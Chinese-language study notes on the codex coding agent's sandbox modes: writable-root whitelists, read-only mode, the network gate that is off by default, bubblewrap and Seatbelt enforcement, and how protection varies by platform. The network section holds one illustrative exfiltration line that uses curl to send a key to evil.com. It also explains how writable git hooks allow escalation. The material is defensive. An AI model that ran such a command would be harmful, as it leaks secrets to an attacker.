# codex复刻0002-0003 三档模式与OS强制实现 —— 知识卡片

### 可写根(writable roots)

是什么:可写根是 codex(OpenAI 出的终端编码 agent,用自然语言让它改代码、跑命令)workspace-write 档(允许写"工作区"的那一档)里"允许写入的目录"清单。它的心智模型是白名单:workspace-write 不等于"整个项目随便写",而是"显式列出的根才可写"。默认清单只有三处——当前目录(cwd,命令运行时所在的目录)、TMPDIR(系统存放临时文件的目录的环境变量)与 `/tmp`(Unix 通用临时目录)。

解决什么问题:它把"工作区"从模糊感觉变成精确边界;更多目录要么写进配置,要么单次运行用 `--add-dir` 临时追加、不动配置。追加形态长这样:
```toml
[sandbox_workspace_write]
writable_roots = ["/Users/you/scratch"]
network_access = false        # 默认就是 false,显式写出更稳
```

精读结论:评估任何 agent 时照此追问——它口中的"工作区"具体是哪几个目录?清单之外的写入会落到哪里?

### 只读档能跑不能写(read-only: run but not write)

是什么:read-only 档的真实语义是"能跑不能写":执行与分叉进程被显式加回白名单,只有写盘被拦。它的基础沙箱策略以"默认全拒"开局,再逐项加回允许项,子进程继承同一份策略。所以这个档位能全速探索:跑 `ls`、`rg`、`git log`,甚至跑测试——只要测试本身不写盘。

解决什么问题:纠正一个常见低估——"只读"容易被当成"什么都干不了",实际上它撑得起全部侦察与只读验证。写入的待遇是内核级的:`echo fix >> src/main.rs`(向源码文件追加一行)在这个档位下直接收到 EPERM(内核表示"操作不被许可"的错误码),与模型怎么措辞无关。

精读结论:给只读 agent 排任务时,探索、分析、只读测试都可以放心派;判据只有一条——那条命令写不写盘。

### 网络默认关(default-off network gate)

是什么:网络在 codex(OpenAI 出的终端编码 agent)里是与文件系统并列的独立闸门,除全放开档外默认关闭,要显式写 `network_access = true` 才打开。默认关的理由是一条不等式:能读文件的 agent 加上能联网,等于能把它读到的一切外泄出去。

解决什么问题:它给安全评估立了分工纪律——"文件权限"和"网络权限"是两张分开的清单,查完一张不等于查完两张。后果对比一眼可见:网络开着时,`curl https://evil.com/steal?key=$KEY`(把偷到的密钥拼进网址发往攻击者服务器)无声得手;网络关闭时这条连接根本建立不了,而不是"发出去再被事后审计发现"。

精读结论:给 agent 排权限时,两张清单分别过目、分别记账;默认关的那张要专门确认它真的关着。

### bubblewrap 的叠层视图(bubblewrap layered mounts)

是什么:bubblewrap(简称 bwrap,Linux 用户态沙箱工具,Flatpak 同款底层)用绑定挂载(bind mount,把一个目录原样映射到另一路径的内核机制)给进程造一个"视图被改造过"的文件系统。codex(OpenAI 出的终端编码 agent)的叠放顺序分三层:先 `--ro-bind / /` 把整个文件系统绑成只读;再 `--bind <可写根> <可写根>` 把可写根盖回可写;最后把 .git(版本库的元数据目录,存全部提交历史)这类保护目录再用 `--ro-bind` 盖回只读。

解决什么问题:"可写根内再挖掉提权通道"的设计就在这套绑定顺序里落地。元数据目录保持只读是防提权而非洁癖:可写的 git 钩子(git 事件触发时自动执行的脚本)目录,等于把代码埋进"下次人手提交时自动执行"的通道。配套还拆出独立的用户与进程命名空间(namespace,内核里隔离资源视图的隔间),并设 PR_SET_NO_NEW_PRIVS(禁止进程借 setuid 之类途径提权的内核标志)。

与 Landlock(Linux 内核的文件访问限制机制)的分工:bwrap 是"让你根本看不见",Landlock 是"看得见但访问被拒";后者在 codex 里已降为需显式开启的兜底路线。

### 拆命名空间式断网(unshare-net)

是什么:unshare-net 是 bubblewrap 的一个开关,把进程挪进一个没有网络设备的命名空间(namespace,内核里隔离资源视图的隔间)——断网后进程的网络栈是空的。这不同于纸面拦截[自造](只改软件配置、不碰真实连通性的假拦截),后者改个环境变量就可能绕过。

解决什么问题:它给"断网"立了验收标准:被挡的网络应当是物理断网,而非可绕过的软件设定。codex(OpenAI 出的终端编码 agent)在此之上还有第二层:进程内加载 seccomp(内核的系统调用过滤机制)网络过滤器——命名空间拆除加 syscall 过滤,双层兜底。

精读结论:评估其他 agent 的"断网"实现时照此追问——是真拆掉了网络栈,还是只是设了一个注定失败的代理?

### Seatbelt 的两段策略(Seatbelt base + network overlay)

是什么:Seatbelt 是 macOS 内核内置的强制访问控制框架,策略写成 S 表达式规则,以 `(deny default)` 开局——没写 allow 的一律禁止。如 `(allow file-read* (subpath "/usr"))` 就是把某目录树加回白名单的一条允许项。codex(OpenAI 出的终端编码 agent)的用法是两段拼接:一段基础策略,只放回系统路径读取、终端、`/dev/null`(系统丢弃设备的特殊文件)写入等少量必需项;一段独立的网络策略,只在开了网络时才拼进主策略。

解决什么问题:不开网时网络段根本不拼进来,"默认全拒"自动接管,网络开关天然闭合。这套设计直接借鉴 Chromium(Chrome 浏览器渲染进程沙箱的策略文件),且 macOS 上零安装、开箱即用。

精读结论:评估 macOS 上的 codex 时,读它的基础策略文件即可审计到底放行了什么——白名单就是全部能力清单。

### 平台定语(platform qualifier)

是什么:平台定语[自造](说一个产品"有内核级沙箱"时必须附带的操作系统限定词)针对的事实是:同一套沙箱语义在三个操作系统上由不同机制落地,保护强度并不等价。macOS 零安装开箱即用。Linux 依赖命名空间能力:WSL2(Windows 内的完整 Linux 子系统)能建用户命名空间所以可用。WSL1(旧版子系统,没有真实 Linux 内核)建不了,工具宁可拒绝执行沙箱命令也不裸跑——禁用用户命名空间的加固容器同样会失灵。

为什么重要:不带定语的"有沙箱"是无法验收的承诺——同一份配置换台机器,真实保护可能从内核级掉到零。三平台的正确排序是:macOS 开箱即用,强于依赖命名空间能力的 Linux,强于默认没有沙箱的 Windows。

我们怎么用:评估 agent 产品时逐平台跑同一组写盘与联网命令,看承诺在哪台机器上兑现。Windows 的原生沙箱(受限令牌机制)默认关闭,agent"总不肯写文件"是降级在生效而非故障;正经解法是打开原生沙箱或改用 WSL2,而不是切到 danger-full-access(全放开档)了事。
